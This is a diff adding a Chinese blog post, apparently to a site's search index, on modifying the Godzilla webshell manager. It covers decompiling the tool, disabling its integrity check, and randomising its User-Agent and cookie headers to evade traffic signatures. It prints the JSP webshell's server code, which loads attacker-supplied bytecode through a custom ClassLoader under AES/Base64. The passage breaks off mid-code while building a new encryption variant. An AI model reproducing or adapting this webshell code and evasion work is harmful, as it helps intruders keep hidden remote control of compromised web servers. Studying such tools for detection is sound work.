@@ -488,6 +488,540 @@
       </tags>
   </entry>
   <entry>
+    <title>Godzilla二次开发学习</title>
+    <url>/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[<h2 id="项目搭建"><a href="#项目搭建" class="headerlink" title="项目搭建"></a>项目搭建</h2><p><em>参考链接</em><a class="link"   href="https://blog.csdn.net/ggqiuhui/article/details/144934675?spm=1001.2014.3001.5502" >https://blog.csdn.net/ggqiuhui/article/details/144934675?spm=1001.2014.3001.5502<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<h3 id="下载godzilla源码并且反编译"><a href="#下载godzilla源码并且反编译" class="headerlink" title="下载godzilla源码并且反编译"></a>下载godzilla源码并且反编译</h3><p><a class="link"   href="https://github.com/BeichenDream/Godzilla/releases" >https://github.com/BeichenDream/Godzilla/releases<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> </p>
+<p>反编译可以使用在线网站反编译</p>
+<p><a class="link"   href="https://www.decompiler.com/" >https://www.decompiler.com/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740672615872-49e68deb-4ef9-409a-a828-b336eec601eb.png"
+                      class="" title="img"
+                >
+
+<p> 在线反编译平台把它丢进去就好了</p>
+<h3 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h3><p>idea创建项目</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740672691782-10349508-2b03-452e-98b9-462443d8e45b.png"
+                      class="" title="img"
+                >
+
+<p>这样子就好了</p>
+<p>然后将反编译出来的源码改的顺眼一点的名字改成godzilla</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740672747089-5e3ddd04-32fb-4349-ac0a-54181beaef49.png"
+                      class="" title="img"
+                >
+
+<p>复制这个目录</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740672770133-e44ed91b-23e3-41d4-a932-7298f9eda80a.png"
+                      class="" title="img"
+                >
+
+<p>鼠标选中根目录粘贴即可</p>
+<p><em>新建一个lib文件夹</em></p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740672849319-5dec5ace-c812-447e-acae-a9f7dd4b17b1.png"
+                      class="" title="img"
+                >
+
+<p> 将原本的jar下载下来的放进去右键添加为库</p>
+<h3 id="配置工件"><a href="#配置工件" class="headerlink" title="配置工件"></a>配置工件</h3><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740672891521-4af08076-b409-4b1f-b1f4-ff538eb0eb8c.png"
+                      class="" title="img"
+                >
+
+<p>项目结构选择工件</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740672909199-1c932ec3-8e03-4fde-b786-5f300537c3a3.png"
+                      class="" title="img"
+                >
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740672922973-a2283f3e-5471-43f9-987d-8f7ae9a98d76.png"
+                      class="" title="img"
+                >
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740672939050-5d6d2bbb-42fe-49f3-9405-8f0ec0d6f9dc.png"
+                      class="" title="img"
+                >
+
+<p> 选中即可</p>
+<h2 id="二次开发的步骤"><a href="#二次开发的步骤" class="headerlink" title="二次开发的步骤"></a>二次开发的步骤</h2><h3 id="项目结构"><a href="#项目结构" class="headerlink" title="项目结构"></a>项目结构</h3><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740673014484-20939626-e7d7-44a8-ab89-55e7517afc67.png"
+                      class="" title="img"
+                >
+
+<p>此时src目录是空的</p>
+<p>因为哥斯拉有个本身的哈希校验，所以我们得把那段代码注释掉</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740673423776-9d4bd7a0-0faa-4498-b91c-6af383e2f4f2.png"
+                      class="" title="img"
+                >
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740673107471-bd45cabe-aea6-4cb8-9fa3-591db8c0573e.png"
+                      class="" title="img"
+                >
+
+<p>就是这个地方需要更改，所以我们需要按照目录结构把applicationconfig.java部署到src目录下</p>
+<p><strong>原本的目录godzilla&#x2F;core&#x2F;ApplicationConfig.java</strong></p>
+<p><strong>现在的目录src&#x2F;core&#x2F;ApplicationConfig.java</strong></p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740673212453-e1e3e52c-51f1-4165-a0f5-c6f0dd8c3e8a.png"
+                      class="" title="img"
+                >
+
+<p> 只有在src目录下更改的代码才有用！！！</p>
+<h3 id="构建代码并运行"><a href="#构建代码并运行" class="headerlink" title="构建代码并运行"></a>构建代码并运行</h3><p>然后我们构建代码并运行即可</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740673245542-fa40d05a-6094-41c4-ab9e-b456958e8f87.png"
+                      class="" title="img"
+                >
+
+<p>补充这个地方需要勾选上<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740673277351-c2222fb9-6e69-4420-8ac8-9373e7a01b01.png"
+                      class="" title="img"
+                ></p>
+<p>此时就生成了我们修改后的jar</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740673323996-f078c5e4-e0dd-45f3-9562-4c347e04f396.png"
+                      class="" title="img"
+                >
+
+<p>成功运行</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740673341785-376adfdb-046e-4135-835f-ee07e2bca1e3.png"
+                      class=""
+                > 
+
+<h2 id="header特征修改"><a href="#header特征修改" class="headerlink" title="header特征修改"></a>header特征修改</h2><h3 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h3><p>哥斯拉有个明显的特征</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740673728998-51394f37-6aa2-4500-abee-58b5b2fc5a0b.png"
+                      class="" title="img"
+                >
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740673670980-0bf8bb3a-4ab5-4520-8d66-f90449a2d215.png"
+                      class=""
+                > 
+
+<h3 id="修改特征"><a href="#修改特征" class="headerlink" title="修改特征"></a>修改特征</h3><p><em>tips</em></p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740724466501-e8e30bfb-c87d-4afe-9761-4aa879cc44e5.png"
+                      class="" title="img"
+                >
+
+<p>生成我们的测试木马的时候要选择带有base64的，因为aes加密是二进制的，所以我们burp里面会是乱码</p>
+<h4 id="aes数据包"><a href="#aes数据包" class="headerlink" title="aes数据包"></a>aes数据包</h4><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740724533073-af561f86-d2fd-4cdb-b874-329c5f62f648.png"
+                      class="" title="img"
+                >
+
+<h4 id="base64数据包"><a href="#base64数据包" class="headerlink" title="base64数据包"></a>base64数据包</h4><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740724550430-41513145-6fe6-49b4-88fc-1774d40170f5.png"
+                      class="" title="img"
+                > 
+
+<h3 id="user-agent"><a href="#user-agent" class="headerlink" title="user-agent"></a>user-agent</h3><p>通过全局搜索发现accept和ua头的配置都在这里</p>
+<p>godzilla&#x2F;core&#x2F;ui&#x2F;component&#x2F;frame&#x2F;ShellSetting.java</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740673951489-bab984cc-c656-4138-8d62-392a80d92f23.png"
+                      class="" title="img"
+                >
+
+<p>所以我们就更换到src目录下给他来个ua列表随机生成</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740674040720-9406fcaa-5a6f-4c1a-b9ef-aa40f6f1e7fb.png"
+                      class="" title="img"
+                >
+
+<p>修改的部份</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740674101079-194adbbe-b956-4a00-9edd-e8f8d24ec1e3.png"
+                      class="" title="img"
+                >
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">List&lt;String&gt; userAgentList = Arrays.asList(</span><br><span class="line">                &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36&quot;,</span><br><span class="line">                &quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11&quot;,</span><br><span class="line">                &quot;Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.133 Safari/534.16&quot;,</span><br><span class="line">                &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11&quot;</span><br><span class="line">        );</span><br><span class="line">        Random random = new Random();</span><br><span class="line">        String randomUserAgent = userAgentList.get(random.nextInt(userAgentList.size()));</span><br></pre></td></tr></table></figure></div>
+
+<p>构建目录运行即可</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740724295269-2eba20cb-d20e-49e9-adcd-505313ff8117.png"
+                      class="" title="img"
+                >
+
+<p>此时UA特征已经改变了</p>
+<h3 id="cookies"><a href="#cookies" class="headerlink" title="cookies"></a>cookies</h3><p>godzilla&#x2F;util&#x2F;http&#x2F;HttpResponse.java</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740674273595-78d1862c-ca81-4fcb-a10c-d0889f458b6c.png"
+                      class="" title="img"
+                >
+
+<p>把这个点直接丢给gpt更改了，要求最后一个cookies的时候不要分号</p>
+<p>src&#x2F;util&#x2F;http&#x2F;HttpResponse.java</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740674485823-ea0928b2-9adb-46d4-9767-517314fe6221.png"
+                      class="" title="img"
+                >
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">protected void handleHeader(Map&lt;String, List&lt;String&gt;&gt; map) &#123;</span><br><span class="line">    this.headerMap = map;</span><br><span class="line">    try &#123;</span><br><span class="line">        this.message = map.get(null).get(0);</span><br><span class="line">        Http http = this.shellEntity.getHttp();</span><br><span class="line">        http.getCookieManager().put(http.getUri(), map);</span><br><span class="line">        http.getCookieManager().getCookieStore().get(http.getUri());</span><br><span class="line">        </span><br><span class="line">        List&lt;HttpCookie&gt; cookies = http.getCookieManager().getCookieStore().get(http.getUri());</span><br><span class="line">        StringBuilder sb = new StringBuilder();</span><br><span class="line">        </span><br><span class="line">        // 遍历cookies并拼接</span><br><span class="line">        for (int i = 0; i &lt; cookies.size(); i++) &#123;</span><br><span class="line">            HttpCookie cookie = cookies.get(i);</span><br><span class="line">            sb.append(String.format(&quot;%s=%s&quot;, cookie.getName(), cookie.getValue()));</span><br><span class="line">            // 如果不是最后一个cookie，加上分号和空格</span><br><span class="line">            if (i &lt; cookies.size() - 1) &#123;</span><br><span class="line">                sb.append(&quot;; &quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        // 如果有cookie，添加到headers中</span><br><span class="line">        if (sb.length() &gt; 0) &#123;</span><br><span class="line">            this.shellEntity.getHeaders().put(&quot;Cookie&quot;, sb.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; catch (IOException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/1740724334378-367cdd49-e8d9-459f-836f-0f41069efb56.png"
+                      class="" title="img"
+                >
+
+<p> 已经没有分号</p>
+<h2 id="修改请求包的加密方式（初学AES-2次base64）"><a href="#修改请求包的加密方式（初学AES-2次base64）" class="headerlink" title="修改请求包的加密方式（初学AES+2次base64）"></a>修改请求包的加密方式（初学AES+2次base64）</h2><p>我们现在默认使用的是AES+Base64，那我们初步学习，可以使用AES+Base64+Base64去了解加解密的步骤，以及如果我们要自主添加加解密的时候需要哪些步骤</p>
+<h3 id="分析加密部分目录结构"><a href="#分析加密部分目录结构" class="headerlink" title="分析加密部分目录结构"></a>分析加密部分目录结构</h3><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317160549894.png"
+                      class="" title="image-20250317160549894"
+                > 
+
+<p>这里面可以观摩下代码</p>
+<h4 id="Generate-class"><a href="#Generate-class" class="headerlink" title="Generate.class"></a>Generate.class</h4><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317160621637.png"
+                      class="" title="image-20250317160621637"
+                > 
+
+<p>大概了解代码可以知道这里是生成webshell文件的。里面的参数或者文件类型可以结合上面的shell.jsp以及base64code.bin相关文件了解</p>
+<h4 id="JavaAesBase64-class"><a href="#JavaAesBase64-class" class="headerlink" title="JavaAesBase64.class"></a>JavaAesBase64.class</h4><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317161846907.png"
+                      class="" title="image-20250317161846907"
+                > 
+
+<p>初始化的步骤</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317161911906.png"
+                      class="" title="image-20250317161911906"
+                > 
+
+<p>加解密的步骤。</p>
+<p>可以思考一下是否可以在此加密地方多加一次base64加密</p>
+<ul>
+<li>客户端多base64一次，那服务端jsp代码解密的时候也要多解密一次base64。</li>
+<li>服务端响应的base64多加密一次，客户端接收的时候解密decode也需要多解密一次。</li>
+</ul>
+<p><strong>所以服务端解密是依据客户端加密，客户端解密依据于服务端响应加密</strong> </p>
+<h4 id="shell-jsp"><a href="#shell-jsp" class="headerlink" title="shell.jsp"></a>shell.jsp</h4><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317160725719.png"
+                      class="" title="image-20250317160725719"
+                > 
+
+<p>shell.jsp非常简单，两个变量，是不是可以感觉名字有点像，base64Code.bin、base64GlobalCode.bin这两个，如果我们用的是base64的加密方式那是不是就感觉他们把两个文件跟上面两个参数替换了一下</p>
+<h4 id="base64GlobalCode-bin"><a href="#base64GlobalCode-bin" class="headerlink" title="base64GlobalCode.bin"></a>base64GlobalCode.bin</h4><p>这里的bin文件我丢给gpt格式化了一下，好看一点</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 定义加密密钥和传递参数</span><br><span class="line">String xc = &quot;&#123;secretKey&#125;&quot;;</span><br><span class="line">String pass = &quot;&#123;pass&#125;&quot;;</span><br><span class="line">String md5 = md5(pass + xc);</span><br><span class="line"></span><br><span class="line">// 自定义类加载器，用于动态加载字节码</span><br><span class="line">class X extends ClassLoader &#123;</span><br><span class="line">    public X(ClassLoader z) &#123;</span><br><span class="line">        super(z);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 定义方法，用于将字节数组转换为Class对象</span><br><span class="line">    public Class&lt;?&gt; Q(byte[] cb) &#123;</span><br><span class="line">        return super.defineClass(cb, 0, cb.length);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// AES 加密/解密方法</span><br><span class="line">public byte[] x(byte[] s, boolean m) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        // 获取AES加密实例</span><br><span class="line">        javax.crypto.Cipher c = javax.crypto.Cipher.getInstance(&quot;AES&quot;);</span><br><span class="line">        // 初始化加密或解密模式</span><br><span class="line">        c.init(m ? javax.crypto.Cipher.ENCRYPT_MODE : javax.crypto.Cipher.DECRYPT_MODE,</span><br><span class="line">               new javax.crypto.spec.SecretKeySpec(xc.getBytes(), &quot;AES&quot;));</span><br><span class="line">        // 执行加密或解密操作</span><br><span class="line">        return c.doFinal(s);</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// MD5 哈希方法</span><br><span class="line">public static String md5(String s) &#123;</span><br><span class="line">    String ret = null;</span><br><span class="line">    try &#123;</span><br><span class="line">        // 获取MD5实例</span><br><span class="line">        java.security.MessageDigest m = java.security.MessageDigest.getInstance(&quot;MD5&quot;);</span><br><span class="line">        // 更新哈希值</span><br><span class="line">        m.update(s.getBytes(), 0, s.length());</span><br><span class="line">        // 转换为16进制字符串并大写</span><br><span class="line">        ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    return ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Base64 编码方法</span><br><span class="line">public static String base64Encode(byte[] bs) throws Exception &#123;</span><br><span class="line">    Class&lt;?&gt; base64;</span><br><span class="line">    String value = null;</span><br><span class="line">    try &#123;</span><br><span class="line">        // 尝试使用 java.util.Base64</span><br><span class="line">        base64 = Class.forName(&quot;java.util.Base64&quot;);</span><br><span class="line">        Object encoder = base64.getMethod(&quot;getEncoder&quot;, null).invoke(base64, null);</span><br><span class="line">        value = (String) encoder.getClass().getMethod(&quot;encodeToString&quot;, new Class[]&#123;byte[].class&#125;)</span><br><span class="line">                                  .invoke(encoder, new Object[]&#123;bs&#125;);</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            // 如果 java.util.Base64 不可用，尝试使用 sun.misc.BASE64Encoder</span><br><span class="line">            base64 = Class.forName(&quot;sun.misc.BASE64Encoder&quot;);</span><br><span class="line">            Object encoder = base64.newInstance();</span><br><span class="line">            value = (String) encoder.getClass().getMethod(&quot;encode&quot;, new Class[]&#123;byte[].class&#125;)</span><br><span class="line">                                    .invoke(encoder, new Object[]&#123;bs&#125;);</span><br><span class="line">        &#125; catch (Exception e2) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Base64 解码方法</span><br><span class="line">public static byte[] base64Decode(String bs) throws Exception &#123;</span><br><span class="line">    Class&lt;?&gt; base64;</span><br><span class="line">    byte[] value = null;</span><br><span class="line">    try &#123;</span><br><span class="line">        // 尝试使用 java.util.Base64</span><br><span class="line">        base64 = Class.forName(&quot;java.util.Base64&quot;);</span><br><span class="line">        Object decoder = base64.getMethod(&quot;getDecoder&quot;, null).invoke(base64, null);</span><br><span class="line">        value = (byte[]) decoder.getClass().getMethod(&quot;decode&quot;, new Class[]&#123;String.class&#125;)</span><br><span class="line">                                .invoke(decoder, new Object[]&#123;bs&#125;);</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            // 如果 java.util.Base64 不可用，尝试使用 sun.misc.BASE64Decoder</span><br><span class="line">            base64 = Class.forName(&quot;sun.misc.BASE64Decoder&quot;);</span><br><span class="line">            Object decoder = base64.newInstance();</span><br><span class="line">            value = (byte[]) decoder.getClass().getMethod(&quot;decodeBuffer&quot;, new Class[]&#123;String.class&#125;)</span><br><span class="line">                                    .invoke(decoder, new Object[]&#123;bs&#125;);</span><br><span class="line">        &#125; catch (Exception e2) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>了解代码除了定义 </p>
+<p><strong>String xc &#x3D; “{secretKey}”;<br>String pass &#x3D; “{pass}”;<br>String md5 &#x3D; md5(pass + xc);</strong> </p>
+<p>其余都是函数，所以可以理解上半部分的<strong>xxxGlobalCode.bin</strong> 就是用来写需要用到的函数调用的</p>
+<h4 id="base64Code-bin"><a href="#base64Code-bin" class="headerlink" title="base64Code.bin"></a>base64Code.bin</h4><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">try &#123;</span><br><span class="line">    // 获取请求参数并进行Base64解码</span><br><span class="line">    byte[] data = base64Decode(request.getParameter(&quot;pass&quot;));</span><br><span class="line">    data = x(data, false);</span><br><span class="line"></span><br><span class="line">    // 检查session中是否存在&quot;payload&quot;属性</span><br><span class="line">    if (session.getAttribute(&quot;payload&quot;) == null) &#123;</span><br><span class="line">        // 如果不存在，创建一个新的X类实例并存储到session中</span><br><span class="line">        session.setAttribute(&quot;payload&quot;, new X(this.getClass().getClassLoader()).Q(data));</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        // 如果存在，执行以下逻辑</span><br><span class="line">        request.setAttribute(&quot;parameters&quot;, data);</span><br><span class="line"></span><br><span class="line">        // 创建一个ByteArrayOutputStream用于存储输出</span><br><span class="line">        java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();</span><br><span class="line"></span><br><span class="line">        // 从session中获取Class对象并创建其实例</span><br><span class="line">        Object f = ((Class&lt;?&gt;) session.getAttribute(&quot;payload&quot;)).newInstance();</span><br><span class="line"></span><br><span class="line">        // 调用equals方法（可能用于触发某些逻辑）</span><br><span class="line">        f.equals(arrOut);</span><br><span class="line">        f.equals(pageContext);</span><br><span class="line"></span><br><span class="line">        // 向响应中写入MD5值的前16位</span><br><span class="line">        response.getWriter().write(md5.substring(0, 16));</span><br><span class="line"></span><br><span class="line">        // 调用toString方法（可能用于触发某些逻辑）</span><br><span class="line">        f.toString();</span><br><span class="line"></span><br><span class="line">        // 对arrOut的内容进行处理并进行Base64编码后写入响应</span><br><span class="line">        response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));</span><br><span class="line"></span><br><span class="line">        // 写入MD5值的后16位</span><br><span class="line">        response.getWriter().write(md5.substring(16));</span><br><span class="line">    &#125;</span><br><span class="line">&#125; catch (Exception e) &#123;</span><br><span class="line">    // 捕获异常，但不进行任何处理</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>这里可以看出来是我们jsp运行时候的代码，它会接受请求的参数，并且调用相关加解密，最后返回给前端</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317161635258.png"
+                      class="" title="image-20250317161635258"
+                > 
+
+<h3 id="多加一次base64加密"><a href="#多加一次base64加密" class="headerlink" title="多加一次base64加密"></a>多加一次base64加密</h3><p>请求包的时候多加一次base64</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317162234205.png"
+                      class="" title="image-20250317162234205"
+                > 
+
+<p>根据前面学习的经验，修改的代码要在src目录下然后对应之前的目录，需要在shells.cryptions.目录下，然后我们新建一个JavaAesBase64_2目录，先写generate生成shell的代码</p>
+<h4 id="Generate-java"><a href="#Generate-java" class="headerlink" title="Generate.java"></a>Generate.java</h4><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">package shells.cryptions.JavaAesBase64_2;</span><br><span class="line"></span><br><span class="line">import core.ApplicationContext;</span><br><span class="line">import core.ui.component.dialog.GOptionPane;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line">import util.Log;</span><br><span class="line">import util.functions;</span><br><span class="line"></span><br><span class="line">class Generate &#123;</span><br><span class="line">    private static final String[] SUFFIX = new String[]&#123;&quot;jsp&quot;, &quot;jspx&quot;&#125;;</span><br><span class="line"></span><br><span class="line">    Generate() &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static byte[] GenerateShellLoder(String shellName, String pass, String secretKey, boolean isBin) &#123;</span><br><span class="line">        byte[] data = null;</span><br><span class="line">        try &#123;</span><br><span class="line">            InputStream inputStream = shells.cryptions.JavaAesBase64_2.Generate.class.getResourceAsStream(&quot;template/&quot; + shellName + (isBin ? &quot;raw&quot; : &quot;base64&quot;) + &quot;GlobalCode.bin&quot;);</span><br><span class="line">            String globalCode = new String(functions.readInputStream(inputStream));</span><br><span class="line">            inputStream.close();</span><br><span class="line">            globalCode = globalCode.replace(&quot;&#123;pass&#125;&quot;, pass).replace(&quot;&#123;secretKey&#125;&quot;, secretKey);</span><br><span class="line">            inputStream = shells.cryptions.JavaAesBase64_2.Generate.class.getResourceAsStream(&quot;template/&quot; + shellName + (isBin ? &quot;raw&quot; : &quot;base64&quot;) + &quot;Code.bin&quot;);</span><br><span class="line">            String code = new String(functions.readInputStream(inputStream));</span><br><span class="line">            inputStream.close();</span><br><span class="line">            Object selectedValue = GOptionPane.showInputDialog(null, &quot;suffix&quot;, &quot;selected suffix&quot;, 1, null, SUFFIX, null);</span><br><span class="line">            if (selectedValue != null) &#123;</span><br><span class="line">                String suffix = (String)selectedValue;</span><br><span class="line">                inputStream = shells.cryptions.JavaAesBase64_2.Generate.class.getResourceAsStream(&quot;template/shell.&quot; + suffix);</span><br><span class="line">                String template = new 